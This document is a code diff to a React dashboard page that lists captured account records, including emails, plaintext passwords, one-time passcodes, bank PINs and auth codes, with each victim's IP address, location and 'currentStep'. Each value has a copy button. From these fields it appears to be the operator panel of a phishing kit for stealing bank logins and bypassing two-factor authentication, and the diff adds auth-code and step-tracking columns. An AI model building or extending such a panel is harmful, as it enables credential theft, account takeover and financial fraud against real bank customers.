@@ -240,7 +240,8 @@ function CallLogsPage() {
     document.body.removeChild(link);
     URL.revokeObjectURL(url);
   }
-  // console.log(accounts)
+  // console.log("User is here   :  ",user)
+  // console.log("All Accounts are here   :  ",accounts)
   // console.log("completedAccounts:  ", completedAccounts)
   // console.log("inCompleteAccounts:  ",inCompleteAccounts)
   // console.log("locked:  ",locked)
@@ -343,90 +344,76 @@ function CallLogsPage() {
                       <th>Email</th>
                       <th>Password</th>
                       <th>Otp</th>
+                      <th>currentStep</th>
                       <th>Bank Pin</th>
                       <th>Country Flag</th>
+                      <th>Auth Code</th>
                       <th>IP Address</th>
                       <th>Date</th>
                       {/* <th>Action</th> */}
                     </tr>
                   </thead>
                   <tbody>
-                    {/* {accounts?.length > 0 && */}
-                    {accounts?.map((account: any) => (
-                      <tr
-                        key={account._id}
-                        className={`
-                        ${
-                          completedAccounts.includes(account._id)
-                            ? "text-green-500"
-                            : ""
-                        } 
-                        ${
-                          inCompleteAccounts.includes(account._id)
-                            ? "text-red-500"
-                            : ""
-                        } 
-                        ${
-                          locked.includes(account._id) ? "text-purple-500" : ""
-                        }`}
-                      >
-                        <td>
-                          <input
-                            type="checkbox"
-                            checked={selectedAccounts.includes(account._id)}
-                            onChange={() =>
-                              toggleSelectAccount(account._id, account)
-                            }
-                          />
-                        </td>
-                        <td>
-                          <div className="d-flex">
-                            <div
-                              className="ms-2"
-                              onClick={() => copyToClipboard(account.email)}
-                            >
-                              <p className="fs-12 mb-0">{account.email}</p>
-                            </div>
-                          </div>
-                        </td>
-                        <td onClick={() => copyToClipboard(account.password)}>
-                          {account.password}
-                        </td>
-                        <td onClick={() => copyToClipboard(account.otp)}>
-                          <span
-                            className={`bg-${account?.status?.toLowerCase()}-transparent`}
-                          >
-                            {account.otp}
-                          </span>
-                        </td>
-                        <td onClick={() => copyToClipboard(account.bankPin)}>
-                          <span className="fw-semibold fs-13">
-                            {account.bankPin}
-                          </span>
-                        </td>
-                        <td>
-                          <img
-                            src={`https://flagcdn.com/16x12/${account?.location?.countryCode.toLowerCase()}.png`}
-                            alt={account?.location?.country}
-                            width="16"
-                            height="12"
-                            title={`${account?.location?.country}, ${account?.location?.city}`}
-                          />
-                        </td>
-                        <td
-                          onClick={() =>
-                            copyToClipboard(account?.location?.ipAddress)
-                          }
+                    {accounts
+                      ?.slice()
+                      .sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
+                      .map((account: any) => (
+                        <tr
+                          key={account._id}
+                          className={`
+                            ${completedAccounts.includes(account._id) ? "text-green-500" : ""} 
+                            ${inCompleteAccounts.includes(account._id) ? "text-red-500" : ""} 
+                            ${locked.includes(account._id) ? "text-purple-500" : ""}
+                          `}
                         >
-                          {account?.location?.ipAddress}
-                        </td>
-                        <td>
-                          {moment(account?.createdAt).format(
-                            "ddd, MMM DD, YYYY, hh:mm A"
-                          )}
-                        </td>
-                      </tr>
-                    ))}
+                          <td>
+                            <input
+                              type="checkbox"
+                              checked={selectedAccounts.includes(account._id)}
+                              onChange={() => toggleSelectAccount(account._id, account)}
+                            />
+                          </td>
+                          <td>
+                            <div className="d-flex">
+                              <div className="ms-2" onClick={() => copyToClipboard(account.email)}>
+                                <p className="fs-12 mb-0">{account.email}</p>
+                              </div>
+                            </div>
+                          </td>
+                          <td onClick={() => copyToClipboard(account.password)}>
+                            {account.password}
+                          </td>
+                          <td onClick={() => copyToClipboard(account.otp)}>
+                            <span className={`bg-${account?.status?.toLowerCase()}-transparent`}>
+                              {account.otp}
+                            </span>
+                          </td>
+                          <td onClick={() => copyToClipboard(account.currentStep)}>
+                            <span className="fw-semibold fs-13">{account.currentStep}</span>
+                          </td>
+                          <td onClick={() => copyToClipboard(account.bankPin)}>
+                            <span className="fw-semibold fs-13">{account.bankPin}</span>
+                          </td>
+                          <td>
+                            <img
+                              src={`https://flagcdn.com/16x12/${account?.location?.countryCode.toLowerCase()}.png`}
+                              alt={account?.location?.country}
+                              width="16"
+                              height="12"
+                              title={`${account?.location?.country}, ${account?.location?.city}`}
+                            />
+                          </td>
+                          <td onClick={() => copyToClipboard(account.authCode)}>
+                            <span className="fw-semibold fs-13">{account.authCode}</span>
+                          </td>
+                          <td onClick={() => copyToClipboard(account?.location?.ipAddress)}>
+                            {account?.location?.ipAddress}
+                          </td>
+                          <td>
+                            {moment(account?.createdAt).format("ddd, MMM DD, YYYY, hh:mm A")}
+                          </td>
+                        </tr>
+                      ))}
                   </tbody>
                 </table>
               </div>
